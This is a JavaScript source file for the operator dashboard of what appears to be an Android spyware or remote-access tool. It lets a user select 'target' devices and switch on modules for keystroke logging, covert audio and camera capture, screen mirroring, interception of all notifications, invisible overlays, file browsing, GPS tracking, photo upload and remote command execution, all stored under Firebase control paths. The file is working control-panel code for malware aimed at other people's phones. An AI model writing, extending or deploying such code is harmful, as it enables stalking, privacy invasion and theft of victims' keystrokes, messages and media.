import { db, auth } from "../api/firebase.js";
import {
  ref, set, onValue, remove, get
} from "https://www.gstatic.com/firebasejs/12.0.0/firebase-database.js";
import {
  onAuthStateChanged, signOut,
  reauthenticateWithCredential, EmailAuthProvider,
  updatePassword, deleteUser
} from "https://www.gstatic.com/firebasejs/12.0.0/firebase-auth.js";

/* ─────────────────────────────────────────────
   MODULE CONFIG — 16 modules (from Firebase)
   Firebase path: users/{uid}/devices/{id}/control/modules/{key}
   Global path:   users/{uid}/devices/{id}/control/_global
───────────────────────────────────────────── */
const MODULES = {
  AppBlockerService:    { label: 'App Blocker',            desc: 'Block or restrict specific applications',      icon: 'fa-ban',             color: '#f87171' },
  AudioModule:          { label: 'Audio Recording',        desc: 'Record ambient audio and microphone input',    icon: 'fa-microphone',      color: '#60a5fa' },
  BatteryModule:        { label: 'Battery Monitor',        desc: 'Track battery levels and power state events',  icon: 'fa-battery-half',    color: '#34d399' },
  CameraStreamService:  { label: 'Camera Stream',          desc: 'Live camera feed and remote photo capture',    icon: 'fa-camera',          color: '#fbbf24' },
  DataSyncModule:       { label: 'Data Sync Engine',       desc: 'Sync all collected data to remote server',     icon: 'fa-cloud-arrow-up',  color: '#a78bfa' },
  DeviceStatusModule:   { label: 'Device Diagnostics',     desc: 'Monitor hardware health and system status',    icon: 'fa-heart-pulse',     color: '#22d3ee' },
  FileManagerModule:    { label: 'File Explorer',          desc: 'Browse, read and access device storage',       icon: 'fa-folder-open',     color: '#fb923c' },
  FirebasePresence:     { label: 'Online Presence',        desc: 'Report real-time online and offline status',   icon: 'fa-signal',          color: '#22d3a4' },
  KeyloggerModule:      { label: 'Keystroke Logger',       desc: 'Capture all typed text and keyboard input',    icon: 'fa-keyboard',        color: '#f43f5e' },
  LocationModule:       { label: 'GPS Tracker',            desc: 'Real-time location and movement history',      icon: 'fa-location-dot',    color: '#38bdf8' },
  NetworkModule:        { label: 'Network Monitor',        desc: 'Track network connections and data usage',     icon: 'fa-network-wired',   color: '#818cf8' },
  NotificationListener: { label: 'Notification Listener',  desc: 'Intercept and read all incoming alerts',       icon: 'fa-bell',            color: '#f59e0b' },
  OverlayService:       { label: 'Screen Overlay',         desc: 'Render invisible overlays on device screen',   icon: 'fa-layer-group',     color: '#e879f9' },
  RemoteCommandModule:  { label: 'Remote Command Hub',     desc: 'Execute remote instructions on the device',    icon: 'fa-terminal',        color: '#94a3b8' },
  ScreenStreamService:  { label: 'Screen Mirroring',       desc: 'Live screen capture and remote viewing',       icon: 'fa-display',         color: '#0ea5e9' },
  VolumeControlModule:  { label: 'Volume Controller',      desc: 'Remotely adjust device audio volume levels',   icon: 'fa-volume-high',     color: '#d97706' },
  PhotoObserver:        { label: 'Photo Observer',         desc: 'Monitor and upload new photos from device storage', icon: 'fa-images',          color: '#f472b6' },
};

/* ─────────────────────────────────────────────
   STATE
───────────────────────────────────────────── */
let uid             = null;
let devices         = [];
let currentDeviceId = null;
let currentStoreId  = null;

// Listener management — prevents stacking duplicates
const _unsubs = {};
function unsub(key) { if (_unsubs[key]) { _unsubs[key](); delete _unsubs[key]; } }
function sub(key, dbRef, cb) { unsub(key); _unsubs[key] = onValue(dbRef, cb); }

/* ─────────────────────────────────────────────
   TOAST
───────────────────────────────────────────── */
let _toastTimer = null;

function toast(msg, type = 'success') {
  const el = document.getElementById('toastInner');
  if (!el) return;
  clearTimeout(_toastTimer);

  el.className = `toast-inner t-${type}`;
  el.innerHTML = `
    <div class="toast-icon">${type === 'success' ? '✓' : '✕'}</div>
    <div>${msg}</div>
  `;

  requestAnimationFrame(() => el.classList.add('show'));

  _toastTimer = setTimeout(() => {
    el.classList.remove('show');
  }, 4000);
}

/* ─────────────────────────────────────────────
   HELPERS
───────────────────────────────────────────── */
function deviceLabel(d) {
  if (d.deviceName !== 'Unknown' && d.deviceModel !== 'Unknown') return `${d.deviceName} — ${d.deviceModel}`;
  if (d.deviceName !== 'Unknown') return d.deviceName;
  if (d.deviceModel !== 'Unknown') return d.deviceModel;
  return d.deviceId.slice(0, 12) + '…';
}

function activeId() { return currentStoreId || currentDeviceId || null; }

/* ─────────────────────────────────────────────
   DEVICE SELECTOR UI
───────────────────────────────────────────── */
function fillSelector() {
  const sel = document.getElementById('deviceSelect');
  if (!sel) return;

  if (!devices.length) {
    sel.innerHTML = '<option value="">No devices found</option>';
    document.getElementById('connDot').style.display = 'none';
    return;
  }

  sel.innerHTML =
    '<option value="">Select device…</option>' +
    devices.map(d => `<option value="${d.deviceId}">${deviceLabel(d)}</option>`).join('');

  if (currentStoreId) sel.value = currentStoreId;
  document.getElementById('connDot').style.display = 'block';
}

function initSelector() {
  const sel = document.getElementById('deviceSelect');
  if (!sel) return;
  sel.addEventListener('change', async e => {
    const id = e.target.value;
    if (!id) return;
    try {
      await set(ref(db, `users/${uid}/storeId`), id);
      currentStoreId  = id;
      currentDeviceId = id;
      const d = devices.find(x => x.deviceId === id);
      toast(`Active: ${deviceLabel(d)}`);
      bindPermissions();
    } catch (err) {
      toast('Failed to set active device', 'error');
      sel.value = currentStoreId || '';
    }
  });
}

/* ─────────────────────────────────────────────
   🚀 FAST DEVICE LOAD — 2 parallel get() calls
   (Single round-trip vs old N+1 approach)
───────────────────────────────────────────── */
async function loadDevices() {
  if (!uid) return;

  try {
    // Both requests fire simultaneously — no waiting
    const [devSnap, storeSnap] = await Promise.all([
      get(ref(db, `users/${uid}/devices`)),
      get(ref(db, `users/${uid}/storeId`))
    ]);

    const data = devSnap.val() || {};
    devices = [];

    Object.entries(data).forEach(([deviceId, deviceData], i) => {
      // deviceINFO is nested — already included in the single get() above
      const info = deviceData.deviceINFO || deviceData;
      devices.push({
        id:          i + 1,
        deviceId,
        deviceName:  info.brand   || info.name     || info.deviceName || 'Unknown',
        deviceModel: info.model   || 'Unknown',
        android:     info.androidVersion || info.android || 'Unknown',
        appVersion:  info.appVersion || info.version || 'Unknown',
        lastSeen:    info.lastSeen || 'Never',
      });
    });

    // Resolve active device
    const stored = storeSnap.val();
    if (stored && devices.find(d => d.deviceId === stored)) {
      currentStoreId  = stored;
      currentDeviceId = stored;
    } else if (devices.length) {
      currentStoreId  = devices[0].deviceId;
      currentDeviceId = devices[0].deviceId;
      if (!stored) set(ref(db, `users/${uid}/storeId`), currentStoreId).catch(() => {});
    }

    renderDevices();
    fillSelector();
    renderPermissions();
    bindPermissions();

    // One live listener for device metadata updates
    sub('dev_live', ref(db, `users/${uid}/devices`), snap => {
      const live = snap.val() || {};
      Object.entries(live).forEach(([deviceId, dd]) => {
        const idx = devices.findIndex(d => d.deviceId === deviceId);
        if (idx === -1) return;
        const info = dd.deviceINFO || dd;
        devices[idx].deviceName  = info.brand || info.name || info.deviceName || devices[idx].deviceName;
        devices[idx].deviceModel = info.model || devices[idx].deviceModel;
        devices[idx].android     = info.androidVersion || devices[idx].android;
        devices[idx].appVersion  = info.appVersion || devices[idx].appVersion;
      });
      renderDevices();
      fillSelector();
    });

  } catch (err) {
    console.error('loadDevices:', err);
    toast('Failed to load devices — check connection', 'error');
  }
}

/* ─────────────────────────────────────────────
   RENDER DEVICES TABLE
───────────────────────────────────────────── */
function renderDevices() {
  const tbody  = document.getElementById('devicesTableBody');
  const mobLst = document.getElementById('mobileDevicesList');
  const count  = document.getElementById('deviceCount');
  const footer = document.getElementById('tableFooter');

  if (!devices.length) {
    const empty = `<div class="empty-state">
      <i class="fas fa-mobile-screen-slash"></i>
      <h3>No devices connected</h3>
      <p>Install the app on a target device to get started</p>
    </div>`;
    if (tbody)  tbody.innerHTML  = `<tr><td colspan="7">${empty}</td></tr>`;
    if (mobLst) mobLst.innerHTML = empty;
    if (count)  count.textContent  = '0 devices';
    if (footer) footer.textContent = 'No devices connected.';
    return;
  }

  if (tbody) tbody.innerHTML = devices.map(d => `
    <tr>
      <td><div class="idx">${d.id}</div></td>
      <td><strong>${d.deviceName}</strong></td>
      <td style="color:var(--text2)">${d.deviceModel}</td>
      <td><span class="mono">${d.deviceId.slice(0,14)}…</span></td>
      <td style="color:var(--text2)">${d.android}</td>
      <td><span class="ver-badge">${d.appVersion}</span></td>
      <td>
        <button class="del-btn" data-id="${d.deviceId}">
          <i class="fas fa-trash"></i> Delete
        </button>
      </td>
    </tr>`).join('');

  if (mobLst) mobLst.innerHTML = devices.map(d => `
    <div class="mob-card">
      <div class="mob-card-top">
        <div class="mob-card-left">
          <div class="idx">${d.id}</div>
          <div class="mob-card-name">${d.deviceName}</div>
        </div>
        <span class="ver-badge">${d.appVersion}</span>
      </div>
      <div class="mob-grid">
        <div>
          <div class="mob-field-label">Model</div>
          <div class="mob-field-val">${d.deviceModel}</div>
        </div>
        <div>
          <div class="mob-field-label">Android ID</div>
          <div class="mob-field-val"><span class="mono">${d.deviceId.slice(0,10)}…</span></div>
        </div>
        <div>
          <div class="mob-field-label">Android</div>
          <div class="mob-field-val">${d.android}</div>
        </div>
      </div>
      <div class="mob-card-foot">
        <button class="del-btn" data-id="${d.deviceId}">
          <i class="fas fa-trash"></i> Delete
        </button>
      </div>
    </div>`).join('');

  if (count)  count.textContent  = `${devices.length} device${devices.length > 1 ? 's' : ''} connected`;
  if (footer) footer.textContent = `users/${uid}/devices/`;

  // Bind delete
  document.querySelectorAll('.del-btn').forEach(btn => {
    btn.addEventListener('click', async e => {
      const id = e.currentTarget.dataset.id;
      if (!confirm(`Delete device ${id.slice(0,12)}…?\nAll data will be permanently removed.`)) return;
      try {
        await remove(ref(db, `users/${uid}/devices/${id}`));
        devices = devices.filter(d => d.deviceId !== id);
        renderDevices();
        fillSelector();
        toast('Device removed');
      } catch { toast('Failed to delete device', 'error'); }
    });
  });
}

/* ─────────────────────────────────────────────
   PERMISSIONS — RENDER
   Builds the master global card + 16 module cards
───────────────────────────────────────────── */
function renderPermissions() {
  const grid = document.getElementById('permissionsGrid');
  if (!grid) return;

  let html = `
    <!-- MASTER GLOBAL CARD -->
    <div class="global-card">
      <div class="global-left">
        <div class="global-icon"><i class="fas fa-power-off"></i></div>
        <div>
          <div class="global-title">Master Control</div>
          <div class="global-desc">Globally enable or disable ALL modules at once</div>
          <span class="global-tag">control/_global</span>
        </div>
      </div>
      <label class="toggle toggle-lg">
        <input type="checkbox" id="toggle-_global" disabled>
        <span class="toggle-track"></span>
      </label>
    </div>

    <!-- MODULE GRID (16 modules) -->
    <div class="mod-grid">
  `;

  Object.entries(MODULES).forEach(([key, m]) => {
    html += `
      <div class="mod-card" id="card-${key}">
        <div class="mod-icon" style="background:${m.color}18; color:${m.color};">
          <i class="fas ${m.icon}"></i>
        </div>
        <div class="mod-info">
          <div class="mod-name">${m.label}</div>
          <div class="mod-desc">${m.desc}</div>
          <div class="mod-key">${key}</div>
        </div>
        <label class="toggle">
          <input type="checkbox" id="toggle-${key}" disabled>
          <span class="toggle-track"></span>
        </label>
      </div>
    `;
  });

  html += `</div>`;
  grid.innerHTML = html;
}

/* ─────────────────────────────────────────────
   PERMISSIONS — BIND REAL FIREBASE
   Path: users/{uid}/devices/{id}/control/_global
         users/{uid}/devices/{id}/control/modules/{key}
───────────────────────────────────────────── */
function bindPermissions() {
  const id = activeId();

  // No device — disable all
  if (!id) {
    document.querySelectorAll('#permissionsGrid input[type=checkbox]')
      .forEach(t => { t.disabled = true; t.checked = false; });
    return;
  }

  const base = `users/${uid}/devices/${id}/control`;

  // Bind _global
  bindToggle('_global', ref(db, `${base}/_global`), true);

  // Bind all 16 modules
  Object.keys(MODULES).forEach(key => {
    bindToggle(key, ref(db, `${base}/modules/${key}`), false);
  });
}

function bindToggle(key, dbRef, isGlobal) {
  const toggle = document.getElementById(`toggle-${key}`);
  if (!toggle) return;

  // Real-time sync — updates whenever Firebase changes
  sub(`perm_${key}`, dbRef, snap => {
    const val = snap.val();
    // Default true when node doesn't exist yet
    toggle.checked  = (val === null || val === true || val === 'true');
    toggle.disabled = false;

    // Visual feedback on module card
    if (!isGlobal) {
      document.getElementById(`card-${key}`)?.classList.toggle('is-on', toggle.checked);
    }
  });

  // Remove any old change listener before attaching new
  if (toggle._h) toggle.removeEventListener('change', toggle._h);

  toggle._h = async () => {
    toggle.disabled = true; // Prevent double-tap flicker
    const newVal = toggle.checked;
    try {
      await set(dbRef, newVal);
      const name = isGlobal ? 'Master Control' : (MODULES[key]?.label || key);
      toast(`${name} ${newVal ? 'enabled ✓' : 'disabled ✕'}`);
      if (!isGlobal) {
        document.getElementById(`card-${key}`)?.classList.toggle('is-on', newVal);
      }
    } catch (err) {
      console.error('bindToggle write error:', err);
      toast('Write failed — check connection', 'error');
      toggle.checked = !newVal; // Revert on failure
    } finally {
      toggle.disabled = false;
    }
  };

  toggle.addEventListener('change', toggle._h);
}

/* ─────────────────────────────────────────────
   AUTH STATE
───────────────────────────────────────────── */
onAuthStateChanged(auth, async user => {
  if (!user) { window.location.href = '/index.html'; return; }
  uid = user.uid;

  document.getElementById('userEmail').textContent = user.email || 'N/A';
  document.getElementById('userUID').textContent   = uid;

  // Kick off parallel init
  await loadDevices();
  initSelector();
  setupPasswordForm();
  setupDangerZone();
});

/* ─────────────────────────────────────────────
   PASSWORD FORM
───────────────────────────────────────────── */
function setupPasswordForm() {
  const form = document.getElementById('passwordForm');
  if (!form) return;
  form.addEventListener('submit', async e => {
    e.preventDefault();
    const curr = document.getElementById('currentPassword').value.trim();
    const nw   = document.getElementById('newPassword').value;
    const cf   = document.getElementById('confirmPassword').value;

    if (!curr || nw.length < 8 || nw !== cf || curr === nw) {
      toast('Please check your password inputs', 'error'); return;
    }

    showPasswordModal('Change Password', 'Verify your current password to update it.', async () => {
      try {
        await updatePassword(auth.currentUser, nw);
        toast('Password updated successfully! ✓');
        form.reset();
      } catch { toast('Password update failed', 'error'); }
    });
  });
}

/* ─────────────────────────────────────────────
   DANGER ZONE
───────────────────────────────────────────── */
function setupDangerZone() {
  document.getElementById('unlinkBtn')?.addEventListener('click', async () => {
    const id = activeId();
    if (!id) { toast('No active device selected', 'error'); return; }
    showPasswordModal('Unlink Device', 'The device will be permanently removed. A backup is saved automatically.', async () => {
      try {
        const snap = await get(ref(db, `users/${uid}/devices/${id}`));
        if (snap.exists()) {
          await set(ref(db, `deletedDevices/${uid}/${id}`), { deviceId: id, deletedAt: Date.now(), data: snap.val() });
        }
        await remove(ref(db, `users/${uid}/devices/${id}`));
        toast('Device unlinked successfully');
        setTimeout(() => location.reload(), 1500);
      } catch { toast('Unlink failed', 'error'); }
    });
  });

  document.getElementById('deleteUserBtn')?.addEventListener('click', () => {
    showPasswordModal('⚠️ Delete Account', 'This will PERMANENTLY delete your entire account and all device data.', async () => {
      try {
        const snap = await get(ref(db, `users/${uid}`));
        if (snap.exists()) {
          await set(ref(db, `deletedUsers/${uid}`), { uid, email: auth.currentUser.email, deletedAt: Date.now(), data: snap.val() });
        }
        await remove(ref(db, `users/${uid}`));
        await deleteUser(auth.currentUser);
        toast('Account deleted');
        setTimeout(() => signOut(auth), 1500);
      } catch { toast('Delete failed — re-login and try again', 'error'); }
    });
  });
}

/* ─────────────────────────────────────────────
   PASSWORD VERIFICATION MODAL
───────────────────────────────────────────── */
function showPasswordModal(title, message, onConfirm) {
  document.querySelectorAll('.pw-modal').forEach(m => m.remove());

  const modal = document.createElement('div');
  modal.className = 'pw-modal';
  modal.style.cssText = `
    position:fixed;inset:0;background:rgba(0,0,0,.88);
    z-index:1000000;display:flex;align-items:center;justify-content:center;
    backdrop-filter:blur(10px);
  `;

  modal.innerHTML = `
    <div style="background:#13152a;color:#f0f0ff;padding:32px;
      border-radius:16px;max-width:420px;width:90%;
      border:1px solid rgba(99,102,241,.25);
      box-shadow:0 24px 60px rgba(0,0,0,.6);
      font-family:'DM Sans',sans-serif;">
      <div style="display:flex;align-items:center;gap:14px;margin-bottom:22px;">
        <div style="width:46px;height:46px;background:linear-gradient(135deg,#dc2626,#ef4444);
          border-radius:12px;display:flex;align-items:center;justify-content:center;font-size:20px;flex-shrink:0;">⚠️</div>
        <div>
          <div style="font-family:'Sora',sans-serif;font-size:17px;font-weight:800;margin-bottom:4px;">${title}</div>
          <div style="font-size:12px;color:#a8aacf;">${message}</div>
        </div>
      </div>
      <div id="pwStep">
        <label style="display:block;font-size:10px;font-weight:700;color:#5c5e80;text-transform:uppercase;letter-spacing:.6px;margin-bottom:8px;">Confirm Password</label>
        <input id="pwInput" type="password" placeholder="Enter your current password"
          style="width:100%;padding:13px 15px;
            border:1px solid rgba(99,102,241,.25);border-radius:10px;
            background:#1a1d35;color:#f0f0ff;font-size:14px;font-family:'DM Sans',sans-serif;
            box-sizing:border-box;outline:none;transition:border-color .2s;">
      </div>
      <div id="cdStep" style="display:none;text-align:center;padding:10px 0;"></div>
      <div style="display:flex;gap:10px;margin-top:20px;">
        <button id="pwCancel" style="flex:1;padding:12px;background:#1a1d35;
          border:1px solid rgba(99,102,241,.2);border-radius:10px;
          color:#f0f0ff;font-family:'DM Sans',sans-serif;font-weight:600;cursor:pointer;">Cancel</button>
        <button id="pwConfirm" style="flex:1;padding:12px;
          background:linear-gradient(135deg,#dc2626,#ef4444);border:none;border-radius:10px;
          color:#fff;font-family:'DM Sans',sans-serif;font-weight:700;cursor:pointer;" disabled>
          Verify & Continue
        </button>
      </div>
    </div>
  `;

  document.body.appendChild(modal);

  const pwInput  = document.getElementById('pwInput');
  const pwBtn    = document.getElementById('pwConfirm');
  const cdStep   = document.getElementById('cdStep');
  const pwStep   = document.getElementById('pwStep');

  pwInput.addEventListener('focus', () => pwInput.style.borderColor = '#6366f1');
  pwInput.addEventListener('blur',  () => pwInput.style.borderColor = 'rgba(99,102,241,.25)');
  pwInput.addEventListener('input', () => { pwBtn.disabled = !pwInput.value.trim(); });
  document.getElementById('pwCancel').onclick = () => modal.remove();

  pwBtn.onclick = async () => {
    try {
      const cred = EmailAuthProvider.credential(auth.currentUser.email, pwInput.value.trim());
      await reauthenticateWithCredential(auth.currentUser, cred);

      pwStep.style.display = 'none';
      cdStep.style.display = 'block';
      pwBtn.disabled = true;

      let t = 5;
      const iv = setInterval(() => {
        cdStep.innerHTML = `
          <div style="font-size:44px;font-weight:800;color:#ef4444;font-family:'Sora',sans-serif;">${t}</div>
          <div style="font-size:13px;color:#a8aacf;margin-top:8px;">Executing in <strong style="color:#f0f0ff;">${t}s</strong></div>
        `;
        t--;
      }, 1000);

      setTimeout(() => {
        clearInterval(iv);
        cdStep.innerHTML = '<div style="color:#22d3a4;font-size:16px;font-weight:700;">✅ Confirmed!</div>';
        setTimeout(() => { modal.remove(); onConfirm(); }, 600);
      }, 5000);

    } catch (err) {
      toast(err.code === 'auth/wrong-password' ? 'Incorrect password' : 'Verification failed', 'error');
    }
  };

  pwInput.focus();
}

/* ─────────────────────────────────────────────
   TAB SWITCHING
───────────────────────────────────────────── */
document.querySelectorAll('.tab-btn').forEach(btn => {
  btn.addEventListener('click', () => {
    const target = btn.dataset.tab;
    document.querySelectorAll('.tab-btn').forEach(b => b.classList.remove('active'));
    document.querySelectorAll('.section').forEach(s => s.classList.remove('active'));
    btn.classList.add('active');
    document.getElementById(target)?.classList.add('active');
  });
});

/* ─────────────────────────────────────────────
   CONFIRM MODAL (legacy support)
───────────────────────────────────────────── */
document.getElementById('confirmCancel')?.addEventListener('click', () => {
  document.getElementById('confirmModal')?.classList.remove('open');
});